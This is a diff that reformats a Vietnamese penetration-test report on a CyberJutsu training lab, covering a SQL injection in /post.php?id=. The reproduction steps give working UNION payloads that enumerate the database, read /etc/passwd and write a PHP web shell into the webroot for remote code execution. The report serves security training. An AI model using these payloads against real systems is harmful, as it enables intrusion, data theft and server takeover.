@@ -25,22 +25,21 @@ Số thứ tự được đánh tăng dần theo thứ tự liên quan của cá
 <p style="text-align:center;"><em>Lỗ hổng tại http://blogs-chain.cyberjutsu-lab.tech:8090/</em></p>
 
 # II. Chi tiết các lỗ hổng bảo mật
-## 1. CBJS-01: SQL Injection at ```/post.php?id=``` leads to database dumping [<span style="color:#f39c12">High</span>]
+## 1. CBJS-01: SQL Injection at `/post.php?id=` leads to database dumping [<span style="color:#f39c12">High</span>]
 ### Description and Impact 
-Tại website ```http://blogs-chain.cyberjutsu-lab.tech:8090/```, web sẽ hiển thị ra các mục bao gồm ```SSRF TUTORIAL```, ```XSS TUTORIAL```, ```RECON TUTORIAL``` và khi click vào thì sẽ hiển thị nội dưng ứng với id được gán trong DB và theo URL ```http://blogs-chain.cyberjutsu-lab.tech:8090/post.php?id=1``` tương ứng. 
+Tại website `http://blogs-chain.cyberjutsu-lab.tech:8090/`, web sẽ hiển thị ra các mục bao gồm `SSRF TUTORIAL`, `XSS TUTORIAL`, `RECON TUTORIAL` và khi click vào thì sẽ hiển thị nội dưng ứng với id được gán trong DB và theo URL `http://blogs-chain.cyberjutsu-lab.tech:8090/post.php?id=1` tương ứng. 
 Vì đây là tham số nhận vào 1 untrusted data (ở đây là 1 số nguyên), nên có thể cho phép các kẻ tấn công sử dụng nhiều payload SQLi dump được database.
 ### Root Cause Analysis 
 Lỗ hổng SQL Injection xảy ra do lập trình viên không áp dụng các biện pháp bảo vệ khi xử lý dữ liệu đầu vào từ tham số `id` trong phương thức `GET`. Câu truy vấn SQL được xây dựng bằng cách nối chuỗi trực tiếp với giá trị người dùng cung cấp, thay vì sử dụng truy vấn có tham số (prepared statements), dẫn đến việc kẻ tấn công có thể chèn mã SQL tùy ý vào truy vấn.
 
 ![image](/assets/images/WPT/cbjs-blog/image2.png)
 <p style="text-align:center;"><em>Câu query gây lỗi SQLi</em></p>
-</div>
 
 ### Step to reproduce 
-Đầu tiên, mình sẽ thực hiện xem câu ```query``` gốc truy vấn trong table ```posts``` có bao nhiêu ```column``` bằng ```ORDER BY```
-> ORDER BY 3 --> ko gây lỗi
-> ORDER BY 4 --> ko gây lỗi
-> ORDER BY 5 --> gây lỗi
+Đầu tiên, mình sẽ thực hiện xem câu `query` gốc truy vấn trong table `posts` có bao nhiêu `column` bằng `ORDER BY`
+|ORDER BY 3 --> ko gây lỗi
+| ORDER BY 4 --> ko gây lỗi
+| ORDER BY 5 --> gây lỗi
 
 Từ đây mình có thể xác định được là query 4 cột trong câu query gốc. 
 
@@ -50,19 +49,19 @@ Từ đây mình có thể xác định được là query 4 cột trong câu qu
 Đồng thời khi lỗi thì web lại tiết lộ Document Root là <code>/var/www/html</code>
 
 Tiếp tục mình xác định tên DB của web 
-> UNION SELECT 1,2,3,DATABASE()
+| UNION SELECT 1,2,3,DATABASE()
 
 ![image](/assets/images/WPT/cbjs-blog/image4.png)
 <p style="text-align:center;"><em>Xác định tên DB</em></p>
 
 Xác định tên table trong DB 
-> UNION 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='blog'
+| UNION 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='blog'
 
 ![image](/assets/images/WPT/cbjs-blog/image5.png)
 <p style="text-align:center;"><em>Xác định tên table</em></p>
 
 Xác định tên column trong DB 
-> UNION SELECT 1,2,3,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='posts'
+| UNION SELECT 1,2,3,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='posts'
 
 ![image](/assets/images/WPT/cbjs-blog/image6.png)
 <p style="text-align:center;"><em>Xác định tên cột</em></p>
@@ -81,13 +80,13 @@ Sau khi kiểm tra quyền của user hiện tại của cơ sở dữ liệu th
 Lỗ hổng xảy ra do không sử dụng cơ chế truy vấn an toàn (prepared statements) trong xử lý tham số `id` trên endpoint `/post.php`, dẫn đến SQL Injection từ lỗ hổng `CBJS-01`. Ngoài ra, hệ thống còn cấp quyền quá mức cho tài khoản `admin`, bao gồm cả khả năng ghi tệp vào thư mục webroot, tạo điều kiện để kẻ tấn công thực hiện Remote Code Execution sau khi leo thang đặc quyền.
 ### Step to reproduce 
 Từ tham số id, kiểm tra user hiện tại. 
-> UNION SELECT 1,2,3,GROUP_CONCAT(user())
+| UNION SELECT 1,2,3,GROUP_CONCAT(user())
 
 ![image](/assets/images/WPT/cbjs-blog/image7.png)
 <p style="text-align:center;"><em>Xác định user hiện tại</em></p>
 
 Kiểm tra tiếp theo là quyền của user này. 
-> UNION SELECT 1,2,grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="'admin'@'localhost'"
+| UNION SELECT 1,2,grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="'admin'@'localhost'"
 
 ![image](/assets/images/WPT/cbjs-blog/image8.png)
 <p style="text-align:center;"><em>Xác định quyền user hiện tại</em></p>
@@ -95,20 +94,19 @@ Kiểm tra tiếp theo là quyền của user này.
 Thì hầu hết các quyền cao nhất đều nằm ở user này. 
 
 Từ đây mình có thể tác với file chẳng hạn như load 1 file lên để đọc. 
-> UNION SELECT 1,2,3,LOAD_FILE('/etc/passwd')
+| UNION SELECT 1,2,3,LOAD_FILE('/etc/passwd')
 
 ![image](/assets/images/WPT/cbjs-blog/image9.png)
 <p style="text-align:center;"><em>Đọc file /etc/passwd</em></p>
 
 Kiểm tra xem có biến `secure_file_priv` nếu có thì chắc chắn mình ghi file được.
-```
-UNION SELECT 1,2,variable_name,variable_value FROM performance_schema.global_variables WHERE variable_name="secure_file_priv"
-```
+| UNION SELECT 1,2,variable_name,variable_value FROM performance_schema.global_variables WHERE variable_name="secure_file_priv"
+
 ![image](/assets/images/WPT/cbjs-blog/image10.png)
 <p style="text-align:center;"><em>Kiểm tra quyền ghi file</em></p>
 
 Từ đây, mình ghi 1 `web shell` như sau: 
-> UNION SELECT "","","",'<?php system($_REQUEST[1]); ?>' INTO OUTFILE ('/var/www/html/shell.php')
+| UNION SELECT "","","",'<?php system($_REQUEST[1]); ?>' INTO OUTFILE ('/var/www/html/shell.php')
 
 ![image](/assets/images/WPT/cbjs-blog/image11.png)
 <p style="text-align:center;"><em>Ghi một web shell</em></p>
